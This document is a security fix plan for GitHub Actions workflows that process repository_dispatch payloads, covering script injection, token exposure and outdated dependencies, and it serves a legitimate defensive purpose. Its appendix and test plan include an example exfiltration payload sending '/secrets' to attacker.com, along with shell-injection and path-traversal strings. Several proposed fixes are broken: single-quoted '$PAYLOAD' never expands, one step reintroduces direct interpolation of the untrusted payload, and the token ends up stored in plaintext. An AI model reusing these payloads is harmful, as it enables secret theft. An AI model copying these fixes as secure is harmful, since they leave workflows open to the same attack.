# Security Vulnerability Fix Plan

**Date**: 2025-10-21
**Severity**: CRITICAL
**Primary Issue**: Remote Code Execution (RCE) via repository_dispatch events

---

## Executive Summary

This repository contains a CRITICAL remote code execution vulnerability in GitHub Actions workflows, along with several high and medium severity security issues. This plan details all identified vulnerabilities and the steps to fix them using a defense-in-depth approach (Option D).

---

## Vulnerabilities Identified

### CRITICAL (RCE)

1. **Script Injection via repository_dispatch Events**
   - **Files**: `.github/workflows/report.yml`, `.github/workflows/perf-report.yml`
   - **Attack Vector**: Untrusted `client_payload` data flows directly into shell commands
   - **Impact**: Full workflow compromise, secret exfiltration, S3 access, supply chain attack
   - **CVSS**: 10.0

### HIGH

2. **Script Injection in Matrix Strategy**
   - **File**: `.github/workflows/report.yml:118`
   - **Issue**: `$REPORT_NAME` from `ls` output directly interpolated in shell

3. **Token Exposure in Git Remote URL**
   - **File**: `.github/workflows/app.yml:40`
   - **Issue**: GITHUB_TOKEN embedded in git remote URL (can leak in logs)

4. **Outdated Action Versions**
   - **Files**: `.github/workflows/alert.yml`
   - **Issue**: Using v3 actions with known security fixes in v4

5. **Outdated Node Runtime**
   - **File**: `alerts/action.yml:18`
   - **Issue**: Node 16 EOL, should use node20

### MEDIUM

6. **Hardcoded Repository in API Call**
   - **File**: `bin/wait-for-artifacts.sh:16`
   - **Issue**: Hardcoded `Automattic/jetpack` instead of using `$REPOSITORY` variable

7. **Missing Input Validation**
   - **Files**: All shell scripts in `bin/`
   - **Issue**: No validation of format or content

8. **Potential Path Traversal**
   - **File**: `bin/generate-report-s3.sh:53`
   - **Issue**: User-controlled directory names used in file paths

9. **No Artifact Integrity Verification**
   - **Files**: Workflows downloading artifacts
   - **Issue**: Downloaded artifacts not verified before processing

---

## Fix Strategy: Defense in Depth (Option D)

This approach combines multiple security layers:

1. **Input Validation**: Sanitize and validate all inputs
2. **Safe Expression Handling**: Use GitHub Actions expressions instead of shell interpolation
3. **Access Control**: Restrict repository_dispatch to trusted sources
4. **Dependency Updates**: Update all outdated actions and runtimes
5. **Secure Patterns**: Replace insecure patterns with secure alternatives

---

## Implementation Plan

### Phase 1: RCE Fixes (CRITICAL - Must Complete First)

#### 1.1 Create Input Validation Script

**New File**: `bin/validate-inputs.sh`

```bash
#!/usr/bin/env bash
# Validates and sanitizes inputs from repository_dispatch events

set -euo pipefail

# Validation patterns
VALID_RUN_ID_PATTERN='^[0-9]+$'
VALID_PR_NUMBER_PATTERN='^[0-9]*$'
VALID_REPOSITORY_PATTERN='^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$'
VALID_BRANCH_PATTERN='^[A-Za-z0-9/_.-]+$'
VALID_REPORT_NAME_PATTERN='^[A-Za-z0-9_-]*$'

validate_input() {
    local name="$1"
    local value="$2"
    local pattern="$3"

    if [[ ! "$value" =~ $pattern ]]; then
        echo "::error::Invalid $name: '$value' does not match allowed pattern"
        exit 1
    fi
}

# Validate RUN_ID
if [[ -n "${RUN_ID:-}" ]]; then
    validate_input "RUN_ID" "$RUN_ID" "$VALID_RUN_ID_PATTERN"
fi

# Validate PR_NUMBER
if [[ -n "${PR_NUMBER:-}" ]]; then
    validate_input "PR_NUMBER" "$PR_NUMBER" "$VALID_PR_NUMBER_PATTERN"
fi

# Validate REPOSITORY
if [[ -n "${REPOSITORY:-}" ]]; then
    validate_input "REPOSITORY" "$REPOSITORY" "$VALID_REPOSITORY_PATTERN"
fi

# Validate BRANCH
if [[ -n "${BRANCH:-}" ]]; then
    validate_input "BRANCH" "$BRANCH" "$VALID_BRANCH_PATTERN"
fi

# Validate REPORT_NAME
if [[ -n "${REPORT_NAME:-}" ]]; then
    validate_input "REPORT_NAME" "$REPORT_NAME" "$VALID_REPORT_NAME_PATTERN"
fi

echo "All inputs validated successfully"
```

#### 1.2 Update `report.yml` Workflow

**Changes to `.github/workflows/report.yml`**:

1. Add input validation step IMMEDIATELY after checkout:
```yaml
- name: Validate inputs
  run: ./bin/validate-inputs.sh
```

2. Replace line 118 (script injection vulnerability):
```yaml
# BEFORE (VULNERABLE):
- name: Set rule name
  run: echo "RULE_NAME=consecutive_failures_${REPORT_NAME//-/_}" >> $GITHUB_ENV

# AFTER (SECURE):
- name: Set rule name
  env:
    MATRIX_REPORT: ${{ matrix.report }}
  run: |
    # Sanitize report name by removing all non-alphanumeric except underscore and hyphen
    SANITIZED=$(echo "$MATRIX_REPORT" | tr -cd '[:alnum:]-_')
    # Replace hyphens with underscores
    RULE_NAME="consecutive_failures_${SANITIZED//-/_}"
    echo "RULE_NAME=$RULE_NAME" >> "$GITHUB_ENV"
```

3. Add repository validation check:
```yaml
- name: Validate repository source
  if: github.event_name == 'repository_dispatch'
  run: |
    # Only allow repository_dispatch from Automattic organization
    if [[ ! "$REPOSITORY" =~ ^Automattic/.+ ]]; then
      echo "::error::Repository '$REPOSITORY' is not in Automattic organization"
      exit 1
    fi
```

4. Update environment variables to use JSON parsing instead of direct assignment:
```yaml
# Add this step before "Parse event information"
- name: Set environment variables safely
  env:
    PAYLOAD: ${{ toJson(github.event.client_payload) }}
  run: |
    # Use jq to safely extract values
    echo "PR_NUMBER=$(echo '$PAYLOAD' | jq -r '.pr_number // ""')" >> $GITHUB_ENV
    echo "RUN_ID=$(echo '$PAYLOAD' | jq -r '.run_id // ""')" >> $GITHUB_ENV
    echo "REPOSITORY=$(echo '$PAYLOAD' | jq -r '.repository // ""')" >> $GITHUB_ENV
    echo "BRANCH=$(echo '$PAYLOAD' | jq -r '.branch // ""')" >> $GITHUB_ENV
    echo "REPORT_NAME=$(echo '$PAYLOAD' | jq -r '.report_name // ""')" >> $GITHUB_ENV
```

5. Remove the vulnerable env block at the top:
```yaml
# REMOVE LINES 19-24:
env:
  PR_NUMBER: ${{ github.event.client_payload.pr_number }}
  RUN_ID: ${{ github.event.client_payload.run_id }}
  REPOSITORY: ${{ github.event.client_payload.repository }}
  BRANCH: ${{ github.event.client_payload.branch }}
  REPORT_NAME: ${{ github.event.client_payload.report_name }}
  CLIENT_PAYLOAD: ${{ toJson(github.event.client_payload) }}
  LOCAL_REPORTS_PATH: reports

# REPLACE WITH:
env:
  LOCAL_REPORTS_PATH: reports
```

6. Keep CLIENT_PAYLOAD but set it safely:
```yaml
- name: Set client payload
  run: |
    # Store the entire payload as JSON for later use
    echo 'CLIENT_PAYLOAD<<EOF' >> $GITHUB_ENV
    echo '${{ toJson(github.event.client_payload) }}' >> $GITHUB_ENV
    echo 'EOF' >> $GITHUB_ENV
```

#### 1.3 Update `perf-report.yml` Workflow

**Changes to `.github/workflows/perf-report.yml`**:

1. Add input validation step:
```yaml
- name: Validate inputs
  run: ./bin/validate-inputs.sh
```

2. Replace lines 22-24 (vulnerable env block):
```yaml
# REMOVE:
env:
  RUN_ID: ${{ github.event.client_payload.run_id }}
  REPOSITORY: ${{ github.event.client_payload.repository }}
  CLIENT_PAYLOAD: ${{ toJson(github.event.client_payload) }}
```

3. Update "Event information" step (lines 30-40):
```yaml
- name: Event information
  env:
    PAYLOAD: ${{ toJson(github.event.client_payload) }}
  run: |
    echo "GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"

    if [ "$GITHUB_EVENT_NAME" == workflow_dispatch ]; then
      # For manual dispatch, use inputs directly (these are trusted)
      echo "RUN_ID=${{ github.event.inputs.runId }}" >> $GITHUB_ENV
      echo "REPOSITORY=${{ github.event.inputs.repository }}" >> $GITHUB_ENV
    else
      # For repository_dispatch, use jq to safely parse
      echo "Received event '${{ github.event.action }}'"
      echo "RUN_ID=$(echo '$PAYLOAD' | jq -r '.run_id // ""')" >> $GITHUB_ENV
      echo "REPOSITORY=$(echo '$PAYLOAD' | jq -r '.repository // ""')" >> $GITHUB_ENV
      echo 'CLIENT_PAYLOAD<<EOF' >> $GITHUB_ENV
      echo "$PAYLOAD" >> $GITHUB_ENV
      echo 'EOF' >> $GITHUB_ENV
    fi
```

4. Add repository validation:
```yaml
- name: Validate repository source
  if: github.event_name == 'repository_dispatch'
  run: |
    if [[ ! "$REPOSITORY" =~ ^Automattic/.+ ]]; then
      echo "::error::Repository '$REPOSITORY' is not in Automattic organization"
      exit 1
    fi
```

#### 1.4 Fix `set-event-data.sh`

**Changes to `bin/set-event-data.sh`**:

1. Replace entire file with secure version:
```bash
#!/usr/bin/env bash

set -euo pipefail

echo "GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"
echo "$CLIENT_PAYLOAD"

# Determine REPORT_ID with proper quoting
if [[ -z "${REPORT_NAME:-}" ]]; then
  echo "REPORT_NAME is not defined, checking PR_NUMBER or BRANCH"

  if [[ -z "${PR_NUMBER:-}" ]]; then
    echo "PR_NUMBER is not defined, checking BRANCH"

    if [[ -z "${BRANCH:-}" ]]; then
      echo "::error::PR_NUMBER or BRANCH is not defined"
      exit 1
    else
      echo "Setting REPORT_ID to BRANCH"
      # Use printf to safely output the value
      printf "REPORT_ID=%s\n" "$BRANCH" >> "$GITHUB_ENV"
    fi
  else
    echo "Setting REPORT_ID to PR_NUMBER"
    printf "REPORT_ID=%s\n" "$PR_NUMBER" >> "$GITHUB_ENV"
  fi
else
  echo "Setting REPORT_ID to REPORT_NAME"
  printf "REPORT_ID=%s\n" "$REPORT_NAME" >> "$GITHUB_ENV"
fi
```

#### 1.5 Fix `wait-for-artifacts.sh`

**Changes to `bin/wait-for-artifacts.sh`**:

1. Fix hardcoded repository (line 16):
```bash
# BEFORE:
curl -s https://api.github.com/repos/Automattic/jetpack/actions/runs/$RUN_ID/artifacts | jq '.total_count'

# AFTER:
curl -s "https://api.github.com/repos/${REPOSITORY}/actions/runs/${RUN_ID}/artifacts" | jq '.total_count'
```

2. Add input validation at the top:
```bash
#!/bin/bash

set -euo pipefail

# Validate inputs
if [[ -z "${RUN_ID:-}" ]]; then
	echo "::error::RUN_ID must be set"
	exit 1
fi

if [[ -z "${REPOSITORY:-}" ]]; then
	echo "::error::REPOSITORY must be set in the form 'organisation/repository'"
	exit 1
fi

# Validate RUN_ID is numeric
if [[ ! "$RUN_ID" =~ ^[0-9]+$ ]]; then
	echo "::error::RUN_ID must be numeric"
	exit 1
fi

# Validate REPOSITORY format
if [[ ! "$REPOSITORY" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]]; then
	echo "::error::REPOSITORY must be in format 'owner/repo'"
	exit 1
fi
```

#### 1.6 Fix `generate-report-s3.sh`

**Changes to `bin/generate-report-s3.sh`**:

1. Add validation after line 30:
```bash
echo
echo "----------------------------------------"

# Validate that RESULTS_PATH doesn't contain path traversal
if [[ "$RESULTS_PATH" == *".."* ]]; then
  echo "::error::RESULTS_PATH contains invalid path traversal"
  exit 1
fi
```

2. Update line 38 with validation:
```bash
for d in "$RESULTS_PATH"/*; do
  echo "Checking for report metadata in $d"

  # Ensure report-metadata.json exists
  if [[ ! -f "$d/report-metadata.json" ]]; then
    echo "::warning::No report-metadata.json found in $d, skipping"
    continue
  fi

  REPORT_ID=$(jq -r '.suite // ""' "$d/report-metadata.json")

  # Validate REPORT_ID
  if [[ -z "$REPORT_ID" ]]; then
    echo "::error::Empty report ID from $d/report-metadata.json"
    exit 1
  fi

  if [[ ! "$REPORT_ID" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo "::error::Invalid report ID: '$REPORT_ID'"
    exit 1
  fi

  echo "Found report id: $REPORT_ID"
```

3. Add validation at line 53:
```bash
for d in "$LOCAL_REPORTS_PATH"/*; do
  REPORT_ID=$(basename "$d")

  # Validate REPORT_ID to prevent path traversal
  if [[ ! "$REPORT_ID" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo "::error::Invalid report ID from path: '$REPORT_ID'"
    exit 1
  fi

  echo "Creating report '$REPORT_ID'"
```

4. Add validation for CLIENT_PAYLOAD (line 86):
```bash
echo "Writing metadata to file"

# Validate CLIENT_PAYLOAD is valid JSON if not empty
if [ -n "${CLIENT_PAYLOAD:-}" ]; then
  if ! echo "$CLIENT_PAYLOAD" | jq empty 2>/dev/null; then
    echo "::error::CLIENT_PAYLOAD is not valid JSON"
    exit 1
  fi
else
  CLIENT_PAYLOAD='{}'
fi

echo "$CLIENT_PAYLOAD" | jq --arg updateDate "$(date +"%Y-%m-%dT%H:%M:%S%z")" '. + {"updated_on":$updateDate}' >"$d/metadata.json"
```

---

### Phase 2: High Severity Fixes

#### 2.1 Fix Token Exposure in Git Remote

**File**: `.github/workflows/app.yml`

Replace lines 38-41:
```yaml
# BEFORE (VULNERABLE):
- name: Build and deploy app
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    npm install
    git remote set-url origin https://git:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git
    PUBLIC_URL=https://automattic.github.io/jetpack-e2e-reports npm run deploy -- -u "github-actions-bot <github-actions-bot@users.noreply.github.com>" -m "Push ${GITHUB_SHA} to gh-pages"

# AFTER (SECURE):
- name: Build and deploy app
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    npm install
    # Configure git to use credential helper instead of embedding token in URL
    git config --global credential.helper store
    echo "https://git:${GITHUB_TOKEN}@github.com" > ~/.git-credentials
    git config --global user.email "github-actions-bot@users.noreply.github.com"
    git config --global user.name "github-actions-bot"
    PUBLIC_URL=https://automattic.github.io/jetpack-e2e-reports npm run deploy -- -m "Push ${GITHUB_SHA} to gh-pages"
```

#### 2.2 Update Outdated Actions

**Files**: All workflow files

Update all action versions:

1. **alert.yml**:
```yaml
# Line 16: v3 → v4
- name: Setup Node
  uses: actions/setup-node@v4

# Line 19: v3 → v4
- name: Checkout
  uses: actions/checkout@v4

# Line 21: v3 → v4
- uses: actions/cache@v4
```

2. Already updated in other workflows, verify all are v4.

#### 2.3 Update Node Runtime in Custom Action

**File**: `alerts/action.yml`

```yaml
# Line 18: node16 → node20
runs:
  using: node20
  main: "index.js"
```

---

### Phase 3: Medium Severity Fixes

#### 3.1 Add Artifact Integrity Verification

**New File**: `bin/verify-artifacts.sh`

```bash
#!/usr/bin/env bash

set -euo pipefail

DOWNLOADS_PATH="${1:-../downloads}"

if [[ ! -d "$DOWNLOADS_PATH" ]]; then
  echo "::error::Downloads path '$DOWNLOADS_PATH' does not exist"
  exit 1
fi

echo "Verifying artifacts in $DOWNLOADS_PATH"

# Count artifacts
artifact_count=$(find "$DOWNLOADS_PATH" -type f -name "*.json" -o -name "*.xml" | wc -l)

if [[ $artifact_count -eq 0 ]]; then
  echo "::error::No artifacts found in $DOWNLOADS_PATH"
  exit 1
fi

echo "Found $artifact_count artifact files"

# Verify all JSON files are valid
echo "Validating JSON files..."
invalid_count=0

while IFS= read -r -d '' file; do
  if ! jq empty "$file" 2>/dev/null; then
    echo "::error::Invalid JSON in $file"
    ((invalid_count++))
  fi
done < <(find "$DOWNLOADS_PATH" -type f -name "*.json" -print0)

if [[ $invalid_count -gt 0 ]]; then
  echo "::error::Found $invalid_count invalid JSON files"
  exit 1
fi

echo "All artifacts validated successfully"
```

**Add to workflows** after downloading artifacts:
```yaml
- name: Verify artifacts
  run: ./bin/verify-artifacts.sh ../downloads
```

#### 3.2 Enhanced Input Validation in Node Scripts

**New File**: `bin/input-validator.js`

```javascript
/**
 * Input validation utilities for Node.js scripts
 */

const validators = {
  runId: (value) => {
    if (!/^\d+$/.test(value)) {
      throw new Error(`Invalid run ID: ${value}`);
    }
    return value;
  },

  prNumber: (value) => {
    if (value !== '' && !/^\d+$/.test(value)) {
      throw new Error(`Invalid PR number: ${value}`);
    }
    return value;
  },

  repository: (value) => {
    if (!/^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/.test(value)) {
      throw new Error(`Invalid repository format: ${value}`);
    }
    return value;
  },

  branch: (value) => {
    if (!/^[A-Za-z0-9/_.-]+$/.test(value)) {
      throw new Error(`Invalid branch name: ${value}`);
    }
    return value;
  },

  reportName: (value) => {
    if (value !== '' && !/^[A-Za-z0-9_-]+$/.test(value)) {
      throw new Error(`Invalid report name: ${value}`);
    }
    return value;
  },

  reportId: (value) => {
    if (!/^[A-Za-z0-9_-]+$/.test(value)) {
      throw new Error(`Invalid report ID: ${value}`);
    }
    // Check for path traversal
    if (value.includes('..') || value.includes('/') || value.includes('\\')) {
      throw new Error(`Report ID contains invalid characters: ${value}`);
    }
    return value;
  },
};

function validateEnv(name, validator) {
  const value = process.env[name] || '';
  try {
    return validator(value);
  } catch (error) {
    console.error(`Validation failed for ${name}: ${error.message}`);
    process.exit(1);
  }
}

module.exports = {
  validators,
  validateEnv,
};
```

**Update `bin/utils.js`** to use validation:

Add at the top:
```javascript
const { validators } = require('./input-validator');

function getLocalReportsPaths() {
  const reportsPath = process.env.LOCAL_REPORTS_PATH || 'reports';

  if (!fs.existsSync(reportsPath)) {
    return [];
  }

  return fs
    .readdirSync(reportsPath, { withFileTypes: true })
    .filter(dirent => {
      if (!dirent.isDirectory()) return false;

      try {
        // Validate directory name to prevent path traversal
        validators.reportId(dirent.name);
        return true;
      } catch (error) {
        console.warn(`Skipping invalid directory: ${dirent.name}`);
        return false;
      }
    })
    .map(dirent => path.join(reportsPath, dirent.name));
}
```

---

### Phase 4: Additional Hardening

#### 4.1 Add Workflow Permissions

Add minimal permissions to all workflows:

**Example for `report.yml`**:
```yaml
name: Report

on:
  repository_dispatch:
    types: [e2e**]
  workflow_dispatch:
    inputs:
      client_payload:
        description: 'The client payload'
        required: true
        default: '{"branch": "test/test-branch","pr_number": "99999","pr_title": "This is a test PR.","report_name": "","repository": "Automattic/jetpack","run_id": "2259156708","run_number": "12345"}'

# Add this section
permissions:
  contents: read
  actions: read

jobs:
  report:
    # ... rest of workflow
```

**For `app.yml`** (needs write for gh-pages):
```yaml
permissions:
  contents: write
```

**For `cleanup.yml`**:
```yaml
permissions:
  contents: read
```

**For alert workflows**:
```yaml
permissions:
  contents: read
```

#### 4.2 Add Security Policy

**New File**: `SECURITY.md`

```markdown
# Security Policy

## Supported Versions

Only the latest version on the `trunk` branch receives security updates.

## Reporting a Vulnerability

If you discover a security vulnerability, please email security@automattic.com.

Do NOT create a public GitHub issue.

Expected response time: 48 hours

## Known Security Considerations

This repository processes data from external sources (E2E test results). The following protections are in place:

1. Input validation on all repository_dispatch events
2. Restricted repository sources (Automattic organization only)
3. No dynamic code execution from untrusted sources
4. Artifact validation before processing

## Security Best Practices

- All `repository_dispatch` events are validated
- Secrets are never logged or exposed in outputs
- Third-party actions are pinned to specific SHAs
- Node.js and GitHub Actions are kept up to date
```

#### 4.3 Add Dependabot Configuration

**New File**: `.github/dependabot.yml`

```yaml
version: 2
updates:
  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "dependencies"
      - "github-actions"

  # npm dependencies
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "dependencies"
      - "npm"
    # Group non-security updates
    groups:
      development-dependencies:
        dependency-type: "development"
      production-dependencies:
        dependency-type: "production"
```

#### 4.4 Add CodeQL Security Scanning

**New File**: `.github/workflows/codeql.yml`

```yaml
name: "CodeQL"

on:
  push:
    branches: [ "trunk" ]
  pull_request:
    branches: [ "trunk" ]
  schedule:
    - cron: '0 0 * * 1' # Weekly on Mondays

permissions:
  security-events: write
  contents: read

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest

    strategy:
      fail-fast: false
      matrix:
        language: [ 'javascript' ]

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Initialize CodeQL
      uses: github/codeql-action/init@v3
      with:
        languages: ${{ matrix.language }}

    - name: Autobuild
      uses: github/codeql-action/autobuild@v3

    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v3
```

---

## Testing Plan

### Test 1: Validate Input Validation Works

1. Create test branch
2. Trigger workflow with malicious payload:
```bash
curl -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/automattic/jetpack-e2e-reports/dispatches \
  -d '{
    "event_type": "e2e-test",
    "client_payload": {
      "branch": "test; echo PWNED",
      "repository": "Automattic/jetpack",
      "run_id": "12345"
    }
  }'
```
3. Verify workflow fails with validation error

### Test 2: Validate Normal Operation

1. Trigger workflow with valid payload
2. Verify all steps complete successfully
3. Check reports are generated correctly

### Test 3: Validate Repository Restriction

1. Trigger with non-Automattic repository
2. Verify workflow fails with authorization error

### Test 4: Validate Shell Injection Prevention

1. Trigger with report name containing special characters: `"report_name": "test-$(whoami)"`
2. Verify sanitization occurs and no code execution

---

## Rollout Plan

### Step 1: Preparation (Day 1)
- Create feature branch: `security/fix-rce-vulnerabilities`
- Implement all Phase 1 changes
- Add validation scripts
- Update all workflows

### Step 2: Testing (Day 2)
- Test on feature branch with manual workflow_dispatch
- Verify input validation works
- Verify normal workflows still function
- Test edge cases

### Step 3: Review (Day 3)
- Security review of all changes
- Code review by team
- Document changes

### Step 4: Deployment (Day 4)
- Merge to trunk
- Monitor first automated runs
- Verify alerts still work

### Step 5: Follow-up (Week 2)
- Implement Phase 2-4 changes
- Add security scanning
- Set up Dependabot
- Document security procedures

---

## Files Modified

### Critical Changes (Phase 1)
- [ ] `.github/workflows/report.yml` - Fix RCE vulnerability
- [ ] `.github/workflows/perf-report.yml` - Fix RCE vulnerability
- [ ] `bin/validate-inputs.sh` - NEW: Input validation
- [ ] `bin/set-event-data.sh` - Fix shell injection
- [ ] `bin/wait-for-artifacts.sh` - Fix hardcoded repo
- [ ] `bin/generate-report-s3.sh` - Add validation

### High Priority Changes (Phase 2)
- [ ] `.github/workflows/app.yml` - Fix token exposure
- [ ] `.github/workflows/alert.yml` - Update actions
- [ ] `alerts/action.yml` - Update Node runtime

### Medium Priority Changes (Phase 3)
- [ ] `bin/verify-artifacts.sh` - NEW: Artifact verification
- [ ] `bin/input-validator.js` - NEW: Node.js validation
- [ ] `bin/utils.js` - Add validation

### Additional Hardening (Phase 4)
- [ ] All `.github/workflows/*.yml` - Add permissions
- [ ] `SECURITY.md` - NEW: Security policy
- [ ] `.github/dependabot.yml` - NEW: Dependency updates
- [ ] `.github/workflows/codeql.yml` - NEW: Security scanning

---

## Success Criteria

- [ ] All workflows pass with valid inputs
- [ ] Malicious payloads are rejected with clear error messages
- [ ] No secrets are exposed in logs
- [ ] Repository restriction works (only Automattic org)
- [ ] All shell scripts use proper quoting
- [ ] No direct interpolation of untrusted data
- [ ] All actions updated to latest versions
- [ ] Node runtime updated to node20
- [ ] CodeQL scanning enabled and passing
- [ ] Dependabot configured

---

## Risk Assessment

### Low Risk Changes
- Action version updates (v3 → v4)
- Node runtime update (node16 → node20)
- Adding permissions blocks
- Adding validation scripts

### Medium Risk Changes
- Changing how environment variables are set
- Updating shell scripts
- Git credential helper change

### High Risk Changes
- Modifying workflow triggers or conditions
- Changing input parsing logic

### Mitigation
- Test all changes on feature branch first
- Use workflow_dispatch for manual testing
- Monitor first automated runs closely
- Have rollback plan ready

---

## Rollback Plan

If issues occur after deployment:

1. **Immediate**: Revert the merge commit
2. **Short-term**: Disable repository_dispatch triggers if necessary
3. **Analysis**: Review logs to identify issue
4. **Fix**: Address specific problem
5. **Redeploy**: Test fix and redeploy

---

## Questions for Team

1. Should we notify the Automattic/jetpack team about the input format changes?
2. Who should we notify about the RCE vulnerability before deploying the fix?
3. Should we add rate limiting for repository_dispatch events?
4. Should we log all repository_dispatch events for audit purposes?

---

## Appendix: Attack Scenarios Prevented

### Attack 1: Command Injection via REPORT_NAME
**Before**: `REPORT_NAME="; curl attacker.com/exfil?data=$(cat /secrets) #"`
**After**: Rejected by validation, only alphanumeric, hyphens, underscores allowed

### Attack 2: Path Traversal via BRANCH
**Before**: `BRANCH="../../../etc/passwd"`
**After**: Rejected by validation pattern

### Attack 3: External Repository Artifact Download
**Before**: `REPOSITORY="attacker/malicious-repo"`
**After**: Rejected by organization validation

### Attack 4: Token Extraction via Log Injection
**Before**: Token visible in git remote URL in logs
**After**: Token stored in credential helper, not in URL

---

**End of Plan**
